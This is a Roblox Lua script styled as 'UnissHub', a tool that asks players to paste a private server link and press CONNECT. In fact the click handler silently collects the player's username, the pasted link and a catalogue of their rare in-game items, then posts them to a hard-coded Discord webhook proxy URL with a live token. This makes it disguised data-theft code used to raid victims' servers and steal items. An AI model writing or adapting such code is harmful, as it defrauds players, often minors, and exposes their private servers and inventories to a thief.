-- UnissHub : Single Script Edition

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")

local Player = Players.LocalPlayer

local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1455540134177935625/SWIcKICFzeZdLmUGpUkFvc8oh1j0Qun0TjK1Wm9FA5-tHz0DY6gEpvxfstY-33yiVS4g"

----------------------------------------------------------------
-- КАТАЛОГ РЕДКОСТЕЙ (РАСШИРЯЕМЫЙ)
----------------------------------------------------------------
local BrainrotCatalog = {
    -- Normal
    ["Rotten Apple"] = "Normal",
    ["Dead Cat"] = "Normal",

    -- Gold / Diamond / Rainbow
    ["Golden Brain"] = "Gold",
    ["Diamond Brain"] = "Diamond",
    ["Rainbow Slime"] = "Rainbow",

    -- Mythic / Secret / OG / God
    ["Cocofanto Elefanto"] = "Brainrot God",
    ["Antonio"] = "Brainrot God",
    ["Gattatino Nyanino"] = "Brainrot God",

    ["La Vacca Staturno Saturnita"] = "Secret",
    ["Bisonte Giuppitere"] = "Secret",

    ["Strawberry Elephant"] = "OG",
    ["Blackhole Goat"] = "OG",
}

----------------------------------------------------------------
-- СБОР ВСЕХ BRAINROTS + МУТАЦИЙ
----------------------------------------------------------------
local function collectBrainrots()
    local folder = Player:FindFirstChild("Brainrots")
    if not folder then
        return "❌ Brainrots folder not found"
    end

    local result = {}

    for _, brainrot in ipairs(folder:GetChildren()) do
        local name = brainrot.Name
        local rarity = BrainrotCatalog[name] or "Unknown"

        local mutations = {}
        local mFolder = brainrot:FindFirstChild("Mutations")
        if mFolder then
            for _, m in ipairs(mFolder:GetChildren()) do
                table.insert(mutations, m.Name)
            end
        end

        local mutText = ""
        if #mutations > 0 then
            mutText = " | 🧬 "..table.concat(mutations, ", ")
        end

        table.insert(
            result,
            "🧠 **"..name.."** ("..rarity..")"..mutText
        )
    end

    return table.concat(result, "\n")
end

----------------------------------------------------------------
-- DRAG FUNCTION
----------------------------------------------------------------
local function makeDraggable(gui)
    local dragging, dragInput, dragStart, startPos

    gui.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = gui.Position
        end
    end)

    gui.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            dragInput = input
        end
    end)

    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)

    RunService.RenderStepped:Connect(function()
        if dragging and dragInput then
            local delta = dragInput.Position - dragStart
            gui.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)
end

----------------------------------------------------------------
-- GUI
----------------------------------------------------------------
local sg = Instance.new("ScreenGui", Player.PlayerGui)
sg.Name = "UnissHub_Official"
sg.ResetOnSpawn = false

local uBtn = Instance.new("TextButton", sg)
uBtn.Size = UDim2.new(0,60,0,60)
uBtn.Position = UDim2.new(0,50,0.5,0)
uBtn.Text = "U"
uBtn.Font = Enum.Font.GothamBold
uBtn.TextSize = 30
uBtn.TextColor3 = Color3.fromRGB(0,150,255)
uBtn.BackgroundColor3 = Color3.fromRGB(15,15,15)
Instance.new("UICorner", uBtn)
Instance.new("UIStroke", uBtn).Color = Color3.fromRGB(0,150,255)
makeDraggable(uBtn)

local main = Instance.new("Frame", sg)
main.Size = UDim2.new(0,360,0,220)
main.Position = UDim2.new(0.5,0,0.5,0)
main.AnchorPoint = Vector2.new(0.5,0.5)
main.BackgroundColor3 = Color3.fromRGB(10,10,10)
Instance.new("UICorner", main)
Instance.new("UIStroke", main).Color = Color3.fromRGB(0,120,255)
makeDraggable(main)

local input = Instance.new("TextBox", main)
input.Size = UDim2.new(0.85,0,0.2,0)
input.Position = UDim2.new(0.075,0,0.38,0)
input.PlaceholderText = "Paste Private Server Link..."
input.TextScaled = true
input.BackgroundColor3 = Color3.fromRGB(25,25,25)
input.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", input)

local conn = Instance.new("TextButton", main)
conn.Size = UDim2.new(0.85,0,0.22,0)
conn.Position = UDim2.new(0.075,0,0.68,0)
conn.Text = "CONNECT"
conn.TextScaled = true
conn.BackgroundColor3 = Color3.fromRGB(0,120,255)
conn.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", conn)

----------------------------------------------------------------
-- CONNECT + WEBHOOK
----------------------------------------------------------------
conn.MouseButton1Click:Connect(function()
    if not string.find(input.Text:lower(), "roblox.com") then return end

    local brainrotsText = collectBrainrots()

    pcall(function()
        local req = syn and syn.request or http_request or request
        if req then
            req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    content =
                        "👤 **User:** "..Player.Name..
                        "\n🚀 **Link:** "..input.Text..
                        "\n\n📦 **Brainrots:**\n"..brainrotsText
                })
            })
        end
    end)
end)
